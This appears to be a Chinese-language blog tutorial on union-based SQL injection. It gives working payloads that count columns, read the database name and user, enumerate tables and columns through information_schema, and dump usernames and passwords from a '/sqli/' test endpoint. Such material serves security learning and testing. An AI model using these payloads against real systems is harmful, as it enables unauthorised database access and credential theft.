---
layout: post
title: SQL注入详解
categories: 网络安全
description: SQL注入详解
keywords: SQL注入详解
---

SQL注入的几种方式详解

### 1、union联合注入原理

联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。

两个表的字段要数要相同，不然会出现报错。

可以通过`order by`来猜有几个字段

```sql
SELECT * FROM `users` WHERE user_id = 1 order by 8 
```

猜到了有几个字段可以进行以下查询

```sql
SELECT * FROM `users` WHERE user_id = 1 union select 1,2,3,4,5,6,7,8 
# 可以在数字的位置替换成函数
SELECT * FROM `users` WHERE user_id = 1 union select 1,2,3,4,5,6,database(),user()
# 如果不想显示user_id=1的数据，可以修改成-1或者NULL，就只显示后面的内容了
SELECT * FROM `users` WHERE user_id = -1 union select 1,2,3,4,5,6,database(),user()
# 有很多条结果的时候可以加 limit 来限制
```

#### 1.1 联合查询注入获取敏感信息

当确定了可以进行SQL注入的时候，可以通过一些内置函数来获取数据库的信息

```sql
SELECT * FROM `guestbook` WHERE user_id = -1 union select 1,database(),user();
```

#### 1.2 联合查询注入通过 information_schema 获取表

在黑盒的情况下是不知道当前库有什么表的，可以通过 mysql 自带的information_schema 查询当前库的表。
查询当前库的表 limit 1 相当于 limit 1,1 表示显示第一个 1 改成 2 就是第二个如此类推

```sql
# 有请求连接如下，已知可以字符注入 /sqli/?id=1&Submit=Submit

# 构造语句 获取当前位置的第一个表
/sqli/?id=-1' union select 1, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1) --+&Submit=Submit#

# 获取第二个表
/sqli/?id=-1' union select 1, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1 ) --+&Submit=Submit#

# 获取字段，可以通过修改limit 获取不同的字段
((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1))

# 查到字段之后，读取表内的内容
/sqli/?id=-1' union select 1,(select group_concat(user,0x3a,password) from users) --+&Submit=Submit#
```
